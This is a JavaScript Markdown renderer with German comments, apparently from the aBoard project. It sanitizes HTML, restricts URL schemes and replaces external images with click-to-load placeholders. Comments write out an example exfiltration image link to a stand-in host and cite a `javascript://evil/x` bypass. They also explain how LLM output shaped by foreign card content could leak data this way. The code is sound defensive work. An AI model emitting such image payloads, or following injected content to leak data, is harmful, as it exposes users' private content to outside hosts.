/* Markdown-Parser für aBoard (→ ADR-0009, ADR-0010)
   Alle Elemente werden via createElement erzeugt — niemals innerHTML mit Nutzereingaben. */

import { I18n } from './i18n.js';

/* ── Externe Bild-Ziele (F-856 Teil 2, ADR-0122) ──────────────────────────

   Ein `<img src>` auf einen fremden Host lädt beim Rendern von selbst — ohne
   Klick, ohne Rückfrage. Wer den gerenderten Text beeinflussen kann, baut
   damit einen Abflusskanal: `![](https://fremder-host/x?d=…)` schickt den
   Inhalt an den Host, sobald jemand die Karte ansieht.

   Beeinflussen kann diesen Text mehr als nur der Kartenbesitzer: der
   gestreamte LLM-Antworttext (der aus fremdem Karteninhalt entstehen kann,
   siehe F-856 Teil 1), der später daraus persistierte Kommentar — und, ganz
   ohne LLM, jede über den Mail-Ingest (ADR-0092) eingegangene Nachricht. Das
   ist der klassische Zählpixel.

   Warum die Schranke GLOBAL sitzt und nicht nur im LLM-Pfad — die Weiche ist
   in ADR-0122 begründet, hier die Kurzfassung:

     - Ein persistierter LLM-Kommentar ist beim Rendern nicht von einem
       menschlichen zu unterscheiden. Es gibt nur den Anzeigenamen des Autors;
       daran zu hängen hiesse, den Anzeigenamen zu prüfen statt der Herkunft.
     - Derselbe Renderer zeigt Mail-Ingest-Karten. Dort ist der Abfluss ohne
       jedes LLM erreichbar.
     - Ein Schalter mit Default „laden" lässt genau die Aufrufer offen, die
       jemand später hinzufügt (export.js, sidebar.js, …). Das ist die
       Fehlerklasse „halber Fix" als Bauplan.

   Verloren geht nichts: Statt des Bildes erscheint ein Platzhalter, der den
   Host nennt; ein Klick lädt das Bild. Sichtbar statt still. */

/* Lokal und damit unbedenklich: eingebettete Daten, Anhänge, alles ohne
   eigenen Host (relative Pfade, file://) und alles vom eigenen Origin.
   Alles mit einem FREMDEN Host ist extern — unabhängig vom Protokoll.

   Warum nicht am Protokoll (`http:`/`https:`) festgemacht, was der erste
   Anlauf tat: Die Basis ist bei aBoard oft `file://` — das Distributable ist
   ausdrücklich zum Doppelklick gedacht. Und dort ergibt

       new URL('//fremd.example/x', 'file:///home/…/aboard.html')
         → protocol "file:", host "fremd.example"

   also ein Ziel auf einem fremden Rechner mit einem Protokoll, das der
   Protokoll-Test durchgelassen hätte. Der Host ist das belastbare Merkmal,
   nicht das Schema (Sicherheits-Kritiker Sprint 61).

   Die beiden `test`-Zeilen sind kein Gürtel-und-Hosenträger: `new URL` parst
   die Autorität jedes Schemas mit `//`, und `attachment://<uuid>` hat damit
   die UUID als `host`. Ohne diesen Ausschluss würde ausgerechnet der lokale
   Anhang-Pfad zum „fremden Host". */
const LOKALE_SCHEMATA = /^(data|blob|attachment|filesystem):/i;

/* Nur diese beiden Schemata lädt ein `<img>` wirklich von einem fremden Host —
   und nur sie dürfen später in den `href` des Platzhalters (siehe unten).

   Warum diese Liste überhaupt existiert, obwohl die Prüfung am Host ansetzt:
   `new URL` parst die Autorität JEDES Schemas mit `//`. `javascript://evil/x`
   hat damit `host === "evil"` — ein reiner Host-Test hätte das als „externes
   Bild-Ziel" eingestuft und die URL in den Platzhalter-Link geschrieben. Das
   war für einen Tag der Fall (Kritiker-Lauf zum Sprint-61-Abschluss); der
   Fehler entstand aus zwei Fixes, die einzeln richtig waren: der Umstellung
   vom Protokoll auf den Host und dem Wechsel von `<button>` zu `<a href>`. */
const LADBARE_SCHEMATA = /^https?:$/i;

function istExternesBildZiel(src) {
  const s = String(src ?? '').trim();
  if (!s || LOKALE_SCHEMATA.test(s)) return false;
  try {
    const url = new URL(s, document.baseURI);
    if (LOKALE_SCHEMATA.test(url.protocol)) return false;
    /* Kein Host → relativer Pfad, `file:///…`, `mailto:` — nichts Fremdes. */
    if (!url.host) return false;
    /* Fremder Host UND ein Schema, das ein Bild lädt. Beides zusammen, nicht
       eins davon: Das Protokoll allein reichte nicht (unter `file://`-Basis
       trägt ein protokoll-relatives Ziel das Protokoll `file:`), der Host
       allein auch nicht (siehe LADBARE_SCHEMATA oben). */
    if (!LADBARE_SCHEMATA.test(url.protocol) && !s.startsWith('//')) return false;
    return url.host !== location.host;
  } catch {
    /* Nicht auflösbar → kein ladbares Ziel, also auch kein Abfluss. */
    return false;
  }
}

/* Platzhalter statt Bild. Der Klick ersetzt ihn durch das echte `<img>` —
   die Entscheidung liegt damit beim Betrachter, nicht beim Verfasser.

   Warum ein `<a href>` und kein `<button>`, obwohl der Klick gar nicht
   navigieren soll: Der Renderer wird auch für den Druck- und HTML-Export
   benutzt (`src/export.js` serialisiert das Ergebnis mit `outerHTML` in ein
   neues Fenster). Dabei gehen Event-Listener verloren — ein Button ist dort
   tot und verspricht „Klicken zum Laden", ohne etwas zu tun; vor dieser
   Schranke stand im Ausdruck immerhin das Bild (Sicherheits-Kritiker
   Sprint 61). Ein Link überlebt die Serialisierung: In der App fängt der
   Handler den Klick mit `preventDefault` ab und lädt das Bild, im Export
   bleibt er ein normaler Link auf das Ziel. Ein Element, zwei Umgebungen,
   kein Sonderpfad im Export. */
/* Darf dieses Ziel in einen anklickbaren Link bzw. in ein `img.src`?
 *
 * Die Antwort MUSS aus derselben Quelle kommen wie die Entscheidung in
 * `istExternesBildZiel` — dem GEPARSTEN Protokoll, nicht dem rohen String
 * (Sprint-62-Kritiker, K2/V2). Vorher stand hier zweimal
 * `/^\s*(https?:)?\/\//i.test(src)`, und das fiel bei den Schreibweisen
 * auseinander, die der WHATWG-Parser (und jeder Browser) normalisiert:
 * `https:/host/x.png` und `https:host/x.png` sind gültige https-URLs, die
 * Regex hält sie für unbekannt. Ergebnis war eine tote Attrappe — ein
 * Platzhalter „Externes Bild von …", dessen Klick nichts tat und dessen
 * `href` auf `#` zeigte.
 *
 * Der Fehler ist lehrreich, weil er aus einem RICHTIGEN Gedanken entstand:
 * Die zweite Prüfung soll unabhängig von der ersten sein, damit ein Lockern
 * der einen nicht die andere aufweicht. Unabhängig heisst aber „eigene
 * Frage", nicht „eigene Datenquelle" — zwei Antworten auf dieselbe Frage aus
 * zwei verschiedenen Quellen widersprechen sich irgendwann. */
function darfGeladenWerden(src) {
  try {
    return LADBARE_SCHEMATA.test(new URL(src, document.baseURI).protocol);
  } catch {
    return false;
  }
}

function externesBildPlatzhalter(src, alt) {
  let host = '';
  try { host = new URL(src, document.baseURI).host; } catch { host = ''; }
  const a = document.createElement('a');
  a.className = 'md-ext-img';
  /* Der `href` bekommt eine EIGENE Prüfung, obwohl istExternesBildZiel schon
     gefiltert hat. Das ist kein Gürtel-und-Hosenträger, sondern die Lehre aus
     dem Befund, der diese Zeile nötig gemacht hat: Die beiden Funktionen
     beantworten verschiedene Fragen („ist das ein fremdes Bild-Ziel?" vs.
     „darf das in einen anklickbaren Link?"), und wer die eine lockert, denkt
     nicht zwangsläufig an die andere. Der Renderer hält es an seinen beiden
     anderen href-Pfaden genauso (`isSafeUrl` im Sanitizer, `'#'` beim
     Markdown-Link) — diese Stelle war die Ausnahme.
     Die vollständige URL bleibt in `title` und `data-external-src` sichtbar;
     verloren geht nichts, nur die Klickbarkeit eines nicht-ladbaren Ziels.

     Gemessen wird am geparsten Protokoll, nicht am rohen String — Begründung
     bei `darfGeladenWerden`. */
  a.href = darfGeladenWerden(src) ? src : '#';
  a.target = '_blank';
  a.rel = 'noopener noreferrer';
  a.textContent = I18n.t('md.ext-img', host);
  /* Volle Ziel-URL zusätzlich als Tooltip: sichtbar für den, der hinsieht,
     ohne sie im Fliesstext auszubreiten. Lädt nichts. */
  a.title = src;
  a.dataset.externalSrc = src;
  if (alt) a.dataset.alt = alt;
  a.addEventListener('click', (ev) => {
    ev.preventDefault();
    const img = document.createElement('img');
    img.className = 'md-inline-img';
    img.alt = alt || '';
    /* Dieselbe Prüfung wie beim `href` oben. Sie war hier nicht: Ein Ziel,
       dessen `href` defensiv auf `'#'` gesetzt wurde, lud beim Klick
       trotzdem — der Kommentar über dem `href` behauptete das Gegenteil. */
    if (!darfGeladenWerden(src)) return;
    img.src = src;
    a.replaceWith(img);
  });
  return a;
}

/* ── Attachment-Resolver (Variante A: modul-globaler Setter) ─────────── */

/* Wird vom Modal beim Öffnen gesetzt und beim Schließen auf null zurückgesetzt.
   Signatur: (attachmentId: string) → Promise<string | null> (URL oder null).
   Die UUID-Validierung erfolgt im Caller (Modal) — der Resolver bekommt nur IDs
   aus dem eigenen currentCard.attachments. */
let attachmentResolver = null;

export function setAttachmentResolver(fn) {
  attachmentResolver = fn ?? null;
}

/* ── Inline-Renderer ─────────────────────────────────────────────────── */

/* Reihenfolge im Alternativ-Pattern: Bild im Link `[![alt](bild)](ziel)`
   zuerst (F-1864 — sonst schneidet das Link-Token beim ersten `]` ab und
   verlinkt die BILDadresse), dann !\[…\]\(…\) VOR \[…\]\(…\), damit das
   „!"-Präfix nicht vom Link-Token verschluckt wird. */
const INLINE_RE = /(`[^`\n]+`|\*\*[^*\n]+\*\*|\*[^*\n]+\*|~~[^~\n]+~~|\[!\[[^\]\n]*\]\([^)\n]+\)\]\([^)\n]+\)|!\[[^\]\n]*\]\([^)\n]+\)|\[[^\]\n]+\]\([^)\n]+\))/g;

/* ── Modus `sicher` (ADR-0137 §6, Karte #739) ─────────────────────────
   Für Texte aus der Wissensquelle: Beim Anzeigen darf NICHTS laden. Der
   Normalmodus erfüllt das nicht (Bilder gleicher Herkunft und `attachment:`
   laden sofort, rohes HTML läuft durch den Sanitizer, der `img`, `class`
   und `id` erlaubt). Der Aufrufer wählt den Modus ausdrücklich:
   `Markdown.render(text, null, { sicher: true })`.
     - Bilder → nur der Alt-Text, als Text. Kein `attachment:`-Auflösen.
     - Rohes HTML → als Text.
     - Links: `https:` mit rel=noopener noreferrer; relative Ziele werden
       Seitenlinks (`a.md-seitenlink`, Ziel in data-seite, href="#") — die
       Lesesicht fängt den Klick ab und öffnet die Seite; alles andere
       (http:, mailto:, javascript:, //host) → nur der Linktext.
   Bewusst NICHT hinter __SERVER_BUILD__: Der Modus kostet wenige hundert
   Byte, und ein angeforderter, aber wegoptimierter Schutz wäre still
   unsicher. Beide Wege zum <img> (Markdown-Inline und HTML-Block) sind
   abgedeckt — die Lehre aus F-856 (zwei Wege zum selben Element). */
let _sicher = false;

function sichererLink(text, ziel) {
  if (/^https:\/\//i.test(ziel)) {
    const a = document.createElement('a');
    a.textContent = text;
    a.href = ziel;
    a.target = '_blank';
    a.rel = 'noopener noreferrer';
    return a;
  }
  /* Relativ: kein Schema, kein `//host`, kein reiner Anker. */
  if (!/^([a-z][a-z0-9+.-]*:|\/\/|#)/i.test(ziel.trim())) {
    const a = document.createElement('a');
    a.textContent = text;
    a.href = '#';
    a.className = 'md-seitenlink';
    a.dataset.seite = ziel.trim();
    return a;
  }
  return document.createTextNode(text);
}

/* Ein Link-Token in beiden Modi: `sicher` über sichererLink, sonst nur
   http(s)-Ziele, alles andere wird `#`. */
function linkKnoten(text, ziel) {
  if (_sicher) return sichererLink(text, ziel);
  const a = document.createElement('a');
  a.textContent = text;
  a.href = /^https?:\/\//i.test(ziel) ? ziel : '#';
  a.target = '_blank';
  a.rel = 'noopener noreferrer';
  return a;
}

/* UUID-Muster (einfache Validierung — 8-4-4-4-12 Hexziffern) */
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

function renderInline(text) {
  const nodes = [];
  let last = 0;
  let m;
  INLINE_RE.lastIndex = 0;

  while ((m = INLINE_RE.exec(text)) !== null) {
    if (m.index > last) nodes.push(document.createTextNode(text.slice(last, m.index)));
    const token = m[0];

    if (token[0] === '`') {
      const code = document.createElement('code');
      code.className = 'md-inline-code';
      code.textContent = token.slice(1, -1);
      nodes.push(code);
    } else if (token.startsWith('**')) {
      const strong = document.createElement('strong');
      strong.textContent = token.slice(2, -2);
      nodes.push(strong);
    } else if (token[0] === '*') {
      const em = document.createElement('em');
      em.textContent = token.slice(1, -1);
      nodes.push(em);
    } else if (token.startsWith('~~')) {
      const del = document.createElement('del');
      del.textContent = token.slice(2, -2);
      nodes.push(del);
    } else if (token[0] === '!') {
      /* Bild-Inline: ![alt](src) */
      const im = token.match(/^!\[([^\]]*)\]\(([^)]+)\)$/);
      if (_sicher) {
        nodes.push(document.createTextNode(im ? im[1] : token));
      } else if (im) {
        const alt = im[1];
        const src = im[2];
        const img = document.createElement('img');
        img.alt = alt;
        img.className = 'md-inline-img';
        if (src.startsWith('attachment://')) {
          /* ADR-0033: attachment://<uuid> auflösen — nur validierte UUIDs */
          const rawId = src.slice('attachment://'.length);
          img.dataset.attachmentId = rawId;
          if (attachmentResolver && UUID_RE.test(rawId)) {
            attachmentResolver(rawId).then(url => {
              if (url) img.src = url;
            });
          }
        }
        if (istExternesBildZiel(src)) {
          /* F-856: fremder Host → Platzhalter statt automatischem Abruf.
             Steht bewusst NACH dem attachment://-Zweig: Anhänge werden über
             den Resolver aufgelöst und sind lokal. */
          nodes.push(externesBildPlatzhalter(src, alt));
        } else {
          if (/^https?:\/\//i.test(src)) {
            img.src = src;
          }
          /* Sicherheit: kein javascript: oder data: direkt als img.src */
          nodes.push(img);
        }
      } else {
        nodes.push(document.createTextNode(token));
      }
    } else if (token.startsWith('[![')) {
      /* F-1864: Bild im Link (Badge). Gerendert als Link auf das ZIEL mit
         dem Alt-Text als Linktext — das Bild selbst lädt in keinem Modus;
         wer es sehen will, folgt dem Link. Leerer Alt-Text → Zieladresse. */
      const bm = token.match(/^\[!\[([^\]]*)\]\([^)]+\)\]\(([^)]+)\)$/);
      nodes.push(linkKnoten(bm[1] || bm[2], bm[2]));
    } else {
      const lm = token.match(/^\[([^\]]+)\]\(([^)]+)\)$/);
      if (lm) {
        nodes.push(linkKnoten(lm[1], lm[2]));
      } else {
        nodes.push(document.createTextNode(token));
      }
    }
    last = m.index + token.length;
  }

  if (last < text.length) nodes.push(document.createTextNode(text.slice(last)));
  return nodes;
}

function appendInline(parent, text) {
  renderInline(text).forEach(n => parent.appendChild(n));
}

/* ── HTML-Sanitierung (ADR-0089) ─────────────────────────────────────
   Allowlist-basiert; Default-Deny. Läuft IMMER beim htmlBlock-Render —
   kein Opt-out, weil der Render-Pfad sich Doc-Viewer und Karten/Kommentare
   teilt (Server-Modus = untrusted Multi-User). XSS-Schutz: <template>
   parst HTML inert (kein Script-Eval, kein Img-Load); Walker stuft
   nicht-erlaubte Tags zu Text herab und filtert Attribute. */

const HTML_BLOCK_TAGS = new Set([
  'p','div','section','article','aside','details','summary',
  'ul','ol','li','dl','dt','dd',
  'table','thead','tbody','tfoot','tr','td','th','caption',
  'blockquote','pre','hr','br',
  'h1','h2','h3','h4','h5','h6',
  'figure','figcaption',
]);

const HTML_INLINE_TAGS = new Set([
  'a','span','em','strong','code','b','i','u','s','sub','sup',
  'mark','small','del','ins','img','kbd','var','abbr','cite','time',
]);

const HTML_TAG_ALLOWLIST = new Set([...HTML_BLOCK_TAGS, ...HTML_INLINE_TAGS]);

const ATTR_UNIVERSAL = new Set(['class','id','title','lang','dir']);
const ATTR_BY_TAG = {
  a:       new Set(['href','target','rel']),
  img:     new Set(['src','alt','width','height']),
  td:      new Set(['colspan','rowspan','scope','headers']),
  th:      new Set(['colspan','rowspan','scope','headers']),
  time:    new Set(['datetime']),
  details: new Set(['open']),
};

/* Unsichere URL-Schemas (data:image/<bitmap> ist OK; data:image/svg+xml NICHT,
   weil SVG scriptfähig ist; alles andere data:/javascript:/vbscript: weg). */
const UNSAFE_URL_RE = /^\s*(javascript|vbscript):/i;
const SAFE_DATA_IMG_RE = /^\s*data:image\/(png|jpeg|jpg|gif|webp)(;|,)/i;
const ANY_DATA_RE = /^\s*data:/i;

function isSafeUrl(value) {
  if (!value) return false;
  if (UNSAFE_URL_RE.test(value)) return false;
  if (ANY_DATA_RE.test(value)) return SAFE_DATA_IMG_RE.test(value);
  return true; /* http:, https:, mailto:, #fragment, relative — alle OK */
}

/* Sanitizer: HTML-String → DocumentFragment mit ausschließlich erlaubten
   Tags/Attributen. Browser parst per <template>, der inert ist (kein
   Eval, kein Resource-Load). Walker stuft nicht-erlaubte Elemente per
   replaceWith(textContent) zu Text herab. */
function sanitizeHtml(raw) {
  const tpl = document.createElement('template');
  tpl.innerHTML = raw;
  const frag = tpl.content;
  /* Walker: alle Elemente besuchen (TreeWalker filtert leider Text-Kinder
     beim Ersetzen — daher rekursiv mit Vorab-Liste arbeiten). */
  const elements = Array.from(frag.querySelectorAll('*'));
  /* F-856: Elemente, die nach der Attribut-Prüfung durch einen Platzhalter
     ersetzt werden. Gesammelt statt sofort ersetzt — ein replaceWith mitten
     in der Attribut-Schleife zöge dem Rest der Schleife das Element weg. */
  const externeBilder = [];
  for (const el of elements) {
    const tag = el.tagName.toLowerCase();
    if (!HTML_TAG_ALLOWLIST.has(tag)) {
      /* Geblocktes Element: durch seinen sanitisierten Text-Inhalt ersetzen
         (Kinder kommen ggf. im weiteren Walker dran, falls noch verbunden;
         für nested-script gilt: template.innerHTML hat den Script nie
         ausgeführt, hier nur entfernen). */
      el.replaceWith(document.createTextNode(el.textContent || ''));
      continue;
    }
    /* Attribute filtern */
    const allowed = ATTR_BY_TAG[tag];
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      const ok = ATTR_UNIVERSAL.has(name) || (allowed && allowed.has(name));
      if (!ok || name.startsWith('on')) {
        el.removeAttribute(attr.name);
        continue;
      }
      /* URL-Attribute auf sichere Schemas einschränken */
      if ((tag === 'a' && name === 'href') || (tag === 'img' && name === 'src')) {
        if (!isSafeUrl(attr.value)) el.removeAttribute(attr.name);
        /* F-856: Der HTML-Weg ist der ZWEITE Weg zu einem <img src> — der
           Markdown-Bild-Inline ist der erste. Ein Schutz an nur einer der
           beiden Stellen wäre der halbe Fix: `<img src="https://…">` steht
           in jedem Karten-Text genauso zur Verfügung wie `![](…)`.
           Beachte, dass isSafeUrl hier grosszügiger ist als der Inline-Weg
           (protokoll-relative `//host/x`, `http:` und exotische Schemata
           kommen durch) — istExternesBildZiel fängt sie, weil es Host UND
           ladbares Schema prüft. Der erste Anlauf prüfte nur das Protokoll und
           liess `//host/x` unter einer `file://`-Basis durch; der zweite nur
           den Host und liess dafür `javascript://host/x` in den Platzhalter-
           Link. Beide Begründungen stehen dort. */
        else if (tag === 'img' && istExternesBildZiel(attr.value)) {
          externeBilder.push(el);
        }
      }
      /* a-target=_blank: rel=noopener noreferrer erzwingen (ADR-0089) */
      if (tag === 'a' && name === 'target' && attr.value === '_blank') {
        el.setAttribute('rel', 'noopener noreferrer');
      }
    }
  }
  for (const el of externeBilder) {
    el.replaceWith(externesBildPlatzhalter(el.getAttribute('src'), el.getAttribute('alt') || ''));
  }
  return frag;
}

/* ── Block-Tokenizer ─────────────────────────────────────────────────── */

const CHECKLIST_RE = /^- \[( |x)\] (.*)/i;
const UL_RE        = /^[-*] (.*)/;
const OL_RE        = /^(\d+)\. (.*)/;
const HEADING_RE   = /^(#{1,3}) (.*)/;
const BLOCKQUOTE_RE = /^> ?(.*)/;

/* GFM-Pipe-Tabellen-Zeile in Zellen zerlegen (#291).
   Führende/trailing Pipes optional; CommonMark/GFM-konform. Eskapierte
   Pipes (`\|`) werden NICHT unterstützt — eigene Folge-Karte. */
function _splitTableRow(line) {
  let s = line.trim();
  if (s.startsWith('|')) s = s.slice(1);
  if (s.endsWith('|'))   s = s.slice(0, -1);
  return s.split('|').map(c => c.trim());
}

function tokenizeBlocks(text) {
  const lines = text.split('\n');
  const blocks = [];
  let i = 0;

  while (i < lines.length) {
    const line = lines[i];

    /* Leer-Zeile überspringen */
    if (line.trim() === '') { i++; continue; }

    const blockStart = i;

    /* Horizontale Linie */
    if (/^-{3,}$/.test(line.trim())) {
      blocks.push({ type: 'hr', start: blockStart, end: i + 1 });
      i++;
      continue;
    }

    /* Code-Block */
    if (line.startsWith('```')) {
      const lang = line.slice(3).trim();
      const content = [];
      i++;
      while (i < lines.length && !lines[i].startsWith('```')) {
        content.push(lines[i]);
        i++;
      }
      i++; /* schließende Fence überspringen */
      blocks.push({ type: 'code', lang, content: content.join('\n'), start: blockStart, end: i });
      continue;
    }

    /* Überschrift */
    const hm = line.match(HEADING_RE);
    if (hm) {
      blocks.push({ type: 'heading', level: hm[1].length, text: hm[2], start: blockStart, end: i + 1 });
      i++;
      continue;
    }

    /* Blockquote */
    if (BLOCKQUOTE_RE.test(line)) {
      const inner = [];
      while (i < lines.length && BLOCKQUOTE_RE.test(lines[i])) {
        inner.push(lines[i].match(BLOCKQUOTE_RE)[1]);
        i++;
      }
      blocks.push({ type: 'blockquote', lines: inner, start: blockStart, end: i });
      continue;
    }

    /* Checkliste (vor ungeordneter Liste prüfen) */
    if (CHECKLIST_RE.test(line)) {
      const items = [];
      while (i < lines.length && CHECKLIST_RE.test(lines[i])) {
        const cm = lines[i].match(CHECKLIST_RE);
        items.push({ checked: cm[1].toLowerCase() === 'x', text: cm[2], lineIndex: i });
        i++;
      }
      blocks.push({ type: 'checklist', items, start: blockStart, end: i });
      continue;
    }

    /* Ungeordnete Liste */
    if (UL_RE.test(line)) {
      const items = [];
      while (i < lines.length && UL_RE.test(lines[i])) {
        items.push(lines[i].match(UL_RE)[1]);
        i++;
      }
      blocks.push({ type: 'ul', items, start: blockStart, end: i });
      continue;
    }

    /* Geordnete Liste */
    if (OL_RE.test(line)) {
      const items = [];
      while (i < lines.length && OL_RE.test(lines[i])) {
        items.push(lines[i].match(OL_RE)[2]);
        i++;
      }
      blocks.push({ type: 'ol', items, start: blockStart, end: i });
      continue;
    }

    /* GFM-Pipe-Tabelle (#291): Header-Zeile mit |, gefolgt von einer
       Separator-Zeile aus `---`/`:---`/`---:`/`:---:`-Spalten gleicher
       Anzahl. Tokenizer akzeptiert mit oder ohne führende/trailing-Pipes. */
    if (line.includes('|') && i + 1 < lines.length) {
      const next = lines[i + 1];
      const headerCells = _splitTableRow(line);
      const sepCells = _splitTableRow(next);
      if (
        headerCells.length >= 1 &&
        sepCells.length === headerCells.length &&
        sepCells.every(c => /^\s*:?-{3,}:?\s*$/.test(c))
      ) {
        const aligns = sepCells.map(c => {
          const t = c.trim();
          const l = t.startsWith(':');
          const r = t.endsWith(':');
          if (l && r) return 'center';
          if (r) return 'right';
          if (l) return 'left';
          return '';
        });
        const rows = [];
        i += 2;
        while (i < lines.length && lines[i].includes('|') && lines[i].trim() !== '') {
          const cells = _splitTableRow(lines[i]);
          /* Spaltenzahl an Header anpassen (CommonMark/GFM: kürzen oder Leer-Padding) */
          while (cells.length < headerCells.length) cells.push('');
          rows.push(cells.slice(0, headerCells.length));
          i++;
        }
        blocks.push({ type: 'table', header: headerCells, aligns, rows, start: blockStart, end: i });
        continue;
      }
    }

    /* HTML-Block (ADR-0089): Zeile beginnt mit <tag (Tag aus Allowlist),
       Block sammelt alle nicht-leeren Folgezeilen bis Leerzeile/EOF.
       Markdown innerhalb wird NICHT geparst (CommonMark Typ 6/7 vereinfacht).
       Sanitierung passiert beim Render. */
    const hmlMatch = line.match(/^<\/?([a-zA-Z][a-zA-Z0-9]*)\b/);
    if (hmlMatch && HTML_BLOCK_TAGS.has(hmlMatch[1].toLowerCase())) {
      const htmlLines = [];
      while (i < lines.length && lines[i].trim() !== '') {
        htmlLines.push(lines[i]);
        i++;
      }
      blocks.push({ type: 'htmlBlock', raw: htmlLines.join('\n'), start: blockStart, end: i });
      continue;
    }

    /* Absatz: aufeinanderfolgende Normalzeilen */
    const pLines = [];
    while (i < lines.length) {
      const l = lines[i];
      if (!l.trim()) break;
      if (/^```|^-{3,}$|^#{1,3} |^> |^[-*] |^\d+\. /.test(l) || CHECKLIST_RE.test(l)) break;
      /* HTML-Block-Tag am Zeilenanfang beendet den Absatz (ADR-0089). */
      const tagMatch = l.match(/^<\/?([a-zA-Z][a-zA-Z0-9]*)\b/);
      if (tagMatch && HTML_BLOCK_TAGS.has(tagMatch[1].toLowerCase())) break;
      /* Pipe-Tabellen-Header + Separator beenden den Absatz (#291). */
      if (l.includes('|') && i + 1 < lines.length) {
        const sepCells = _splitTableRow(lines[i + 1]);
        const hdrCells = _splitTableRow(l);
        if (sepCells.length === hdrCells.length && hdrCells.length >= 1 &&
            sepCells.every(c => /^\s*:?-{3,}:?\s*$/.test(c))) break;
      }
      pLines.push(l);
      i++;
    }
    if (pLines.length) blocks.push({ type: 'paragraph', lines: pLines, start: blockStart, end: i });
  }

  return blocks;
}

/* ── CSV-Tabellen-Erweiterung (→ ADR-0010) ───────────────────────────── */

/* Bekannte Einschränkung (F-49): RFC-4180-Anführungszeichen werden nicht
   unterstützt — Felder mit Kommas oder Zeilenumbrüchen müssen vermieden werden. */
function renderCsvTable(content) {
  const rows = content.trim().split('\n').map(r => r.split(',').map(c => c.trim()));
  const table = document.createElement('table');
  table.className = 'md-table';
  rows.forEach((row, ri) => {
    const tr = document.createElement('tr');
    row.forEach(cell => {
      const td = document.createElement(ri === 0 ? 'th' : 'td');
      td.textContent = cell;
      tr.appendChild(td);
    });
    table.appendChild(tr);
  });
  return table;
}

/* ── Block-Renderer ──────────────────────────────────────────────────── */

function renderBlock(block, container, onCheckboxToggle) {
  switch (block.type) {

    case 'hr':
      container.appendChild(document.createElement('hr'));
      break;

    case 'heading': {
      const h = document.createElement(`h${block.level}`);
      h.className = `md-h${block.level}`;
      appendInline(h, block.text);
      container.appendChild(h);
      break;
    }

    case 'code': {
      if (block.lang === 'csv') {
        container.appendChild(renderCsvTable(block.content));
      } else {
        const pre = document.createElement('pre');
        pre.className = 'md-pre';
        const code = document.createElement('code');
        if (block.lang) code.className = `language-${block.lang}`;
        code.textContent = block.content;
        pre.appendChild(code);
        container.appendChild(pre);
      }
      break;
    }

    case 'blockquote': {
      const bq = document.createElement('blockquote');
      bq.className = 'md-blockquote';
      block.lines.forEach(line => {
        const p = document.createElement('p');
        appendInline(p, line);
        bq.appendChild(p);
      });
      container.appendChild(bq);
      break;
    }

    case 'checklist': {
      const ul = document.createElement('ul');
      ul.className = 'md-checklist';
      block.items.forEach(item => {
        const li = document.createElement('li');
        const cb = document.createElement('input');
        cb.type = 'checkbox';
        cb.checked = item.checked;
        cb.className = 'md-checkbox';
        cb.dataset.lineIndex = item.lineIndex;
        cb.setAttribute('aria-label', item.text);
        if (onCheckboxToggle) {
          cb.addEventListener('change', (e) => onCheckboxToggle(item.lineIndex, e.target.checked));
        } else {
          cb.disabled = true;
        }
        const label = document.createElement('span');
        label.className = item.checked ? 'md-checklist-done' : '';
        appendInline(label, item.text);
        li.appendChild(cb);
        li.appendChild(label);
        ul.appendChild(li);
      });
      container.appendChild(ul);
      break;
    }

    case 'ul': {
      const ul = document.createElement('ul');
      ul.className = 'md-ul';
      block.items.forEach(text => {
        const li = document.createElement('li');
        appendInline(li, text);
        ul.appendChild(li);
      });
      container.appendChild(ul);
      break;
    }

    case 'ol': {
      const ol = document.createElement('ol');
      ol.className = 'md-ol';
      block.items.forEach(text => {
        const li = document.createElement('li');
        appendInline(li, text);
        ol.appendChild(li);
      });
      container.appendChild(ol);
      break;
    }

    case 'paragraph': {
      const p = document.createElement('p');
      block.lines.forEach((line, idx) => {
        if (idx > 0) p.appendChild(document.createElement('br'));
        appendInline(p, line);
      });
      container.appendChild(p);
      break;
    }

    case 'htmlBlock': {
      /* ADR-0089: HTML-Block wird durch den Allowlist-Sanitizer gefiltert
         und als DocumentFragment eingefügt. <template>-Parser-Sandbox
         verhindert Script-Eval/Resource-Load schon beim Parsen.
         Modus `sicher` (ADR-0137 §6): gar kein HTML, der Block als Text. */
      if (_sicher) {
        const p = document.createElement('p');
        p.textContent = block.raw;
        container.appendChild(p);
      } else {
        container.appendChild(sanitizeHtml(block.raw));
      }
      break;
    }

    case 'table': {
      /* GFM-Pipe-Tabelle (#291). Reuse .md-table-CSS (von CSV-Variante).
         appendInline pro Zelle → bold/italic/code/link/image weiterhin geparst.
         Alignment via inline style (genau wie textContent — kein CSS-State). */
      const table = document.createElement('table');
      table.className = 'md-table';
      const thead = document.createElement('thead');
      const headTr = document.createElement('tr');
      block.header.forEach((cell, idx) => {
        const th = document.createElement('th');
        if (block.aligns[idx]) th.style.textAlign = block.aligns[idx];
        appendInline(th, cell);
        headTr.appendChild(th);
      });
      thead.appendChild(headTr);
      table.appendChild(thead);
      if (block.rows.length) {
        const tbody = document.createElement('tbody');
        block.rows.forEach(row => {
          const tr = document.createElement('tr');
          row.forEach((cell, idx) => {
            const td = document.createElement('td');
            if (block.aligns[idx]) td.style.textAlign = block.aligns[idx];
            appendInline(td, cell);
            tr.appendChild(td);
          });
          tbody.appendChild(tr);
        });
        table.appendChild(tbody);
      }
      container.appendChild(table);
      break;
    }
  }
}

/* ── Öffentliche API ─────────────────────────────────────────────────── */

/* render(text, onCheckboxToggle?, opts?) → HTMLElement (div.md-content)
   onCheckboxToggle: (lineIndex: number, checked: boolean) => void — optional
   opts.sicher: Modus `sicher` (siehe oben) — nichts lädt, kein HTML. */
function render(text, onCheckboxToggle, opts) {
  const container = document.createElement('div');
  container.className = 'md-content';
  if (!text?.trim()) return container;
  _sicher = !!opts?.sicher;
  try {
    tokenizeBlocks(text).forEach(block => renderBlock(block, container, onCheckboxToggle));
  } finally {
    _sicher = false;
  }
  return container;
}

/* Zählt Checklisten-Items im Rohtext → { total, done } | null */
function checklistStats(text) {
  if (!text) return null;
  const lines = text.split('\n');
  const total = lines.filter(l => CHECKLIST_RE.test(l)).length;
  if (!total) return null;
  const done  = lines.filter(l => /^- \[x\] /i.test(l)).length;
  return { total, done };
}

export const Markdown = { render, checklistStats, tokenizeBlocks, renderBlock, setAttachmentResolver };
